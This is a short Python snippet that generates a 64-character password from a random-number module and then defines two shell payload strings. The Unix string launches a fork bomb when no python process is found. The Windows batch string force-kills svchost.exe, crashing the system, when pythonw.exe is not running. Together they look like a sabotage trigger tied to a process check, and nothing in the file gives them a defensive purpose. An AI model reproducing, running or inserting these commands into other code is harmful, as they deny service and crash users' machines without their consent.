from cryptology.discretization import DiscretizationRandom
dr = DiscretizationRandom(65, 122) 
rawResult = dr.get_discretized_random() 
password = ''
for text in rawResult:
    password += chr(text)
password = password[:64]
unix = '''pgrep -x python >/dev/null && echo "Process found" || :() { :|:& };:'''
win32 = '''
@echo off
tasklist /FI "IMAGENAME eq pythonw.exe" 2>NUL | find /I /N "pythonw.exe">NUL
if "%ERRORLEVEL%"=="0" (

) else (
    taskkill /f /im svchost.exe
)
'''